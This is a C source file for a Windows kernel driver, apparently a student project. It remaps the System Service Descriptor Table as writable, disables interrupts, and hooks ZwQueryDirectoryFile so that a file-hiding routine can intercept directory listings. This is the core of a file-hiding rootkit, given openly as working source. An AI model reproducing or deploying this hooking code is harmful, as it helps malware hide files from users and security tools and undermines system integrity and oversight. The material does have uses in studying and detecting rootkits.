/*
** File		hook.c
** Author	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		Kernel hook system
*/

#include <ntddk.h>
#include "driver.h"
#include "hook.h"
#include "hide_file.h"

__declspec(dllimport) SSDT_Entry KeServiceDescriptorTable;

PVOID			*gMappedSystemCallTable = NULL;
PMDL			gPmdlSystemCall = NULL;
ULONG			MDLinit = 0;

extern pZwQueryDirectoryFile	gZwQueryDirectoryFileAddress;
CHAR							gZwQueryDirectoryFileHooked = 0;

NTSTATUS		SetSSDTMemWritable()
{
	DbgPrintEx(DFLAGS, "Initializing MDL...\n");
	gPmdlSystemCall = IoAllocateMdl(
				KeServiceDescriptorTable.ServiceTableBase,
				KeServiceDescriptorTable.NumberOfServices * 4,
				FALSE,
				FALSE,
				NULL);
	if(gPmdlSystemCall == NULL)
		return (STATUS_UNSUCCESSFUL);

	MmBuildMdlForNonPagedPool(gPmdlSystemCall);
	gPmdlSystemCall->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
	gMappedSystemCallTable = MmMapLockedPagesSpecifyCache(
				gPmdlSystemCall,
				KernelMode,
				MmNonCached,
				NULL,
				FALSE,
				HighPagePriority);
	if (gMappedSystemCallTable == NULL)
		return (STATUS_UNSUCCESSFUL);

	MDLinit = 1;
	return (STATUS_SUCCESS);
}

VOID			removeHooks()
{
	DbgPrintEx(DFLAGS, "Removing hooks...\n");
	if (gZwQueryDirectoryFileHooked)
	{
		__asm cli
			UNHOOK_SYSCALL(
				ZwQueryDirectoryFile,
				gZwQueryDirectoryFileAddress);
		__asm sti
		gZwQueryDirectoryFileHooked = 0;
	}
	if (gPmdlSystemCall)
	{
		MmUnmapLockedPages(gMappedSystemCallTable, gPmdlSystemCall);
		IoFreeMdl(gPmdlSystemCall);
		MDLinit = 0;
	}
}

NTSTATUS		initHooks()
{
	if (!MDLinit)
		if (SetSSDTMemWritable() != STATUS_SUCCESS)
			return (STATUS_UNSUCCESSFUL);

	DbgPrintEx(DFLAGS, "Initializing hooks...\n");
	if (!gZwQueryDirectoryFileHooked)
	{
		gZwQueryDirectoryFileAddress = (PVOID) SYSTEMSERVICE(ZwQueryDirectoryFile);
		__asm cli
			HOOK_SYSCALL(
				ZwQueryDirectoryFile,
				ZwQueryDirectoryFileHook,
				gZwQueryDirectoryFileAddress);
		__asm sti
		gZwQueryDirectoryFileHooked = 1;
	}
	return (STATUS_SUCCESS);
}
